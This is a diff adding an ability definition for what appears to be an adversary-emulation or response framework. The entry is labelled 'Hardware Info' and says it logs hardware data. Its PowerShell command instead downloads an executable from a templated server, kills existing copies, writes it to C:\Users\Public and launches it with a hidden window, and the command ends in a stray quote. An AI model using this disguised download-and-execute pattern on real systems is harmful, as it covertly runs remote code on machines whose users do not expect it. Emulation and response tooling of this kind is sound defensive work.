@@ -1,0 +1,26 @@
+- id: eb2402ef-f8d3-43cf-86a6-e504bb1deb3a
+  description: Use scheduled tasks and PowerShell to log hardware information.
+  name: Hardware Info
+  tactic: response
+  technique:
+    attack_id: T1086
+    name: PowerShell
+  platforms:
+    windows:
+      psh:
+        command: |
+          $server="#{app.contact.http}";
+          $url="$server/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","hw64_550.exe")
+          $data=$wc.DownloadData($url);
+          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+          get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"}
+          | stop-process -f;
+          rm -force "C:\Users\Public\$name.exe" -ea ignore;
+          [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
+          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server
+          $server -group blue" -WindowStyle hidden;'
+        payloads:
+        - hw64_550.exe
